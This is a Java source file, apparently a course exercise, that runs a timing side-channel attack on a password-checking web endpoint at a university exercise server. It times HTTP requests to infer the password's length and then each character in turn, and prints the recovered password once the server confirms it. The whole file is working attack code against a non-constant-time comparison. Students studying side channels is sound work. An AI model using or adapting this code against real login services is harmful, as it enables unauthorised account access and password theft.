import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static java.lang.System.exit;


public class ex01_M2 {

    // Const
    public static int NANOSECONDS_IN_MILLISECONDS = 1000000;

    // Configuration
    public static int MIN_PASSWORD_LENGTH = 1;
    public static int MAX_PASSWORD_LENGTH = 32;
    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 1;
    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 1;
    public static int DEBUG_MESSAGE_COUNT = 1;
    public static boolean DEBUG_MESSAGE = true;
    public static int DIFFICULTY = 1;
    public static String USER_ID = "ID";

    // Flags
    public static long FOUND_THE_PASSWORD = -1;
    public static long ERROR_WHILE_CHECK_TIME = 0;


    /*
     Returns the current value of the most precise available system timer, in nanoseconds(10^-9 seconds).
     */
    public static long getCurrentTime() {
        return System.nanoTime();
    }

    public static long checkResponseTime(String url) {
        long start, end;
        try {
            URL site = new URL(url);
            URLConnection conn = site.openConnection();
            conn.setDoInput(true);

            start = getCurrentTime();
            conn.connect();
            end = getCurrentTime();

            InputStream stream = conn.getInputStream();
            byte[] bytesBody={0};
            stream.read(bytesBody);
            String body = new String(bytesBody);

            if("1".equals(body)){
                System.out.println(url);
                return FOUND_THE_PASSWORD;
            }

        } catch (MalformedURLException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Invalid URL Format:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        } catch (IOException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Failed connect to the URL server:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        }

        return end - start;
    }

    public static String buildUrlFromPassword(String password)
    {
        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", USER_ID, password, DIFFICULTY);
    }

    public static void foundTheRightPassword(String password)
    {
        System.out.println(USER_ID + " " + password + " " + DIFFICULTY);
        exit(0);
    }

    public static class PossiblePasswordData{
        Integer passwordAttempts;
        Long passwordSumTime;
        Integer passwordErrors;

        public PossiblePasswordData()
        {
            passwordAttempts = 0;
            passwordSumTime = 0L;
            passwordErrors = 0;
        }
    }

    public static Map<String, PossiblePasswordData> executeTimingAttack(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
    {
        Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
        long responseTime;

        for (String password : passwordsToCheck) {
            result.put(password, new PossiblePasswordData());
        }

        // first call to do some setup in java:
        checkResponseTime(buildUrlFromPassword("123"));

        for (int i = 0; i < numberOfAttempts; i++)
        {
            if (debug && (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / DEBUG_MESSAGE_COUNT) == 0))
            {
                System.out.println(String.format("checked %d", i));
            }

            for (String password : passwordsToCheck) {
                responseTime = checkResponseTime(buildUrlFromPassword(password));

                if (responseTime == FOUND_THE_PASSWORD)
                {
                    foundTheRightPassword(password);
                }
                else if(responseTime == ERROR_WHILE_CHECK_TIME)
                {
                    result.get(password).passwordErrors += 1;
                }
                else
                {
                    result.get(password).passwordAttempts += 1;
                    result.get(password).passwordSumTime += responseTime;
                }

            }
        }

        return result;
    }

    public static void validateAttackResults(Map<String, PossiblePasswordData> results, int checksAttempts)
    {
        for (String password : results.keySet())
        {
            if(results.get(password).passwordErrors == checksAttempts) {
                System.out.println("We have a problem");
                exit(0);
            }
        }
    }

    public static double calculatePercentageChosenPasswordBiggerThenOther(Map<String, PossiblePasswordData> results, String chosenPassword)
    {
        Long sumOfRestOfThePasswords = 0L;
        Integer attemptCountOfRestOfThePasswords = 0;
        for (String password: results.keySet()) {
            if (password.equals(chosenPassword)) {
                continue;
            }
            sumOfRestOfThePasswords += results.get(password).passwordSumTime;
            attemptCountOfRestOfThePasswords += results.get(password).passwordAttempts;
        }

        double chosenPasswordAverage = results.get(chosenPassword).passwordSumTime / results.get(chosenPassword).passwordAttempts;
        double otherPasswordsAverage = sumOfRestOfThePasswords / attemptCountOfRestOfThePasswords;

        return chosenPasswordAverage / otherPasswordsAverage;
    }

    public static int checkPasswordLength() {
        List<String> possiblePasswords = new ArrayList<String>();

        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
        {
            possiblePasswords.add(new String(new char[i]).replace("\0", "a"));
        }

        Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
        validateAttackResults(results, CHECK_PASSWORD_LENGTH_ATTEMPTS);

        String maxAveragePassword = possiblePasswords.get(0);
        double maxAverage = results.get(maxAveragePassword).passwordSumTime / results.get(maxAveragePassword).passwordAttempts;

        for (String password: possiblePasswords) {
            double currentAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;

            if (DEBUG_MESSAGE) {
                System.out.println(String.format("Length %d took %f milliseconds", password.length(), currentAverage / NANOSECONDS_IN_MILLISECONDS));
            }
            if (currentAverage > maxAverage)
            {
                maxAveragePassword = password;
                maxAverage = currentAverage;
            }
        }

        if (DEBUG_MESSAGE) {
            double percentageBigger = calculatePercentageChosenPasswordBiggerThenOther(results, maxAveragePassword);
            System.out.println(String.format("Length %d bigger then other by %f", maxAveragePassword.length(), percentageBigger));
        }

        return maxAveragePassword.length();
    }

    public static String checkThePassword(int passwordLength)
    {
        char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
                'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
                'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

        String charactersFoundFromPassword = "";
        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++)
        {
            List<String> possiblePasswords = new ArrayList<String>();
            for (char someChar: availablePasswordChar)
            {
                String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));

                possiblePasswords.add(password);
            }

            Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
            validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);

            String maxAveragePasswordChar = possiblePasswords.get(0);
            double maxAverage = results.get(maxAveragePasswordChar).passwordSumTime / results.get(maxAveragePasswordChar).passwordAttempts;
            for (String password: possiblePasswords)
            {
                double currentAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;

                if(DEBUG_MESSAGE)
                {
                    System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), currentAverage / NANOSECONDS_IN_MILLISECONDS));
                }
                if (currentAverage > maxAverage)
                {
                    maxAveragePasswordChar = password;
                    maxAverage = currentAverage;
                }

            }

            charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar.charAt(currentPasswordIndex));
            if(DEBUG_MESSAGE) {

                double percentageBigger = calculatePercentageChosenPasswordBiggerThenOther(results, maxAveragePasswordChar);
                System.out.println(String.format("char %c bigger then other by %f", maxAveragePasswordChar.charAt(currentPasswordIndex), percentageBigger));

                System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
            }
        }

        return charactersFoundFromPassword;
    }

    public static void main(String[] args) {
        int passwordLength = checkPasswordLength();
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("Password length is %d", passwordLength));
        }

        String password = checkThePassword(passwordLength);
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("The password is %s", password));
        }

        foundTheRightPassword(password);
    }
}
